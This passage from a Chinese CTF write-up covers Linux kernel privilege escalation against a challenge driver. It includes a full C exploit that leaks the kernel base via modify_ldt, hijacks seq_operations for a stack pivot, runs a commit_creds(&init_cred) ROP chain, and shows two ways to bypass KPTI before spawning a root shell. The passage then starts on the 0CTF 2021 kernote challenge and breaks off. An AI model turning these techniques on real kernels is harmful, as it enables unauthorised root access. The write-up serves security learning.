vmlinux_base;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>泄露完地址之后，就是想办法提升权限了。可以看出来这里并不存在任意地址写，所以思路还是栈迁移随后ROP，这里就需要利用到另一个结构体了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的大小位0x20也满足题目所给的范围，当我们复写了start指针之后调用read就会call start指针控制rip并且此时的rax等于我们的，所以我们可以使用下面这个gadget来劫持rsp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xchg eax,esp</span><br></pre></td></tr></table></figure><p>这里没有办法将prepare_kernel_cred的返回值给到rdi，所以这里使用的是另一种方式，在内核当中有一个特殊的 cred —— <code>init_cred</code>，这是 init 进程的 cred，因此<strong>其权限为 root</strong>，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 <code>commit_creds(&amp;init_cred)</code> 便能完成提权</p><h4 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass kpti"></a><strong>bypass kpti</strong></h4><p>我对于kpti的认知就是，cr3存在相应的页表，如果，在从内核态回到用户态时没修改cr3，那么在用户态就会因为找不到对应的东西出现段错误。</p><p>所以此时就有第一个bypass的思路，因为出现段错误肯定是有某个handle函数来处理，所以我们可以使用signal来修改信号的handle函数。</p><p>第二种就是正常进行rop，但是中间修改一下cr3的值</p><p>一般来说修改cr3需要的gadget是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,cr3</span><br><span class="line">or  rdi,1000h</span><br><span class="line">mov cr3,rdi</span><br></pre></td></tr></table></figure><h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;\0&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">0x10</span>, buf);</span><br><span class="line">    create(<span class="number">0x20</span>, buf);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x8</span>, buf);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"></span><br><span class="line">    swapgs = <span class="number">0xbc889f</span> + kernel_base;</span><br><span class="line">    iretq = <span class="number">0x2df</span> + kernel_base;</span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff810e5bb9</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff8108c420</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xc9540</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xc99d0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x1a6b700</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack = mmap(xchg_eax_esp &amp; <span class="number">0xfffff000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line">    fake_stack = xchg_eax_esp &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack: 0x%llx\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = xchg_eax_esp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_seq_struct[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_seq_struct[<span class="number">0</span>] = xchg_eax_esp;</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, fake_seq_struct);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    fake_stack[i++] = pop_rdi;</span><br><span class="line">    fake_stack[i++] = init_cred;</span><br><span class="line">    fake_stack[i++] = commit_creds;</span><br><span class="line">    fake_stack[i++] = swapgs;</span><br><span class="line">    fake_stack[i++] = iretq;</span><br><span class="line">    fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    fake_stack[i++] = user_cs;</span><br><span class="line">    fake_stack[i++] = user_rflags;</span><br><span class="line">    fake_stack[i++] = user_sp;</span><br><span class="line">    fake_stack[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    read(seq_fd, <span class="number">0x1234</span>, <span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们使用的gadget只有32位，并且rax指向的还是这个gadget的地址，所以这里调用mmap的方式就按照exp中的即可</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814114004277.png"                      alt="image-20220814114004277"                ></p><p>如果这里使用第二种绕过kpti的话可以payload换成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> chang_cr3 = <span class="number">0xffffffff81c00feb</span> + kernel_offset;</span><br><span class="line">fake_stack[i++] = pop_rdi;</span><br><span class="line">fake_stack[i++] = init_cred;</span><br><span class="line">fake_stack[i++] = commit_creds;</span><br><span class="line">fake_stack[i++] = chang_cr3;</span><br><span class="line">fake_stack[i++] = swapgs;</span><br><span class="line">fake_stack[i++] = iretq;</span><br><span class="line">fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">fake_stack[i++] = user_cs;</span><br><span class="line">fake_stack[i++] = user_rflags;</span><br><span class="line">fake_stack[i++] = user_sp;</span><br><span class="line">fake_stack[i++] = user_ss;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814123321832.png"                      alt="image-20220814123321832"                ></p><h3 id="0CTF-2021-final-kernote"><a href="#0CTF-2021-final-kernote" class="headerlink" title="0CTF 2021 final kernote"></a>0CTF 2021 final kernote</h3><p>题目基本和上面一道题一致，不过这里的文件系统采用的ext4，需要拿到内部文件的方法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs.img ./rootfs</span><br><span class="line">......</span><br><span class="line">sudo umount ./rootfs</span><br></pre></td></tr></table></figure><p>这道题目开启的保护有smep，smap，kpti以及kaslr，然后就是题目给了一个raedme文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure><p>可以看到题目使用的堆分配算法是slab而不是默认的slub，所以需要了解一下关于slab的一些特征：</p><ol><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ol><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" 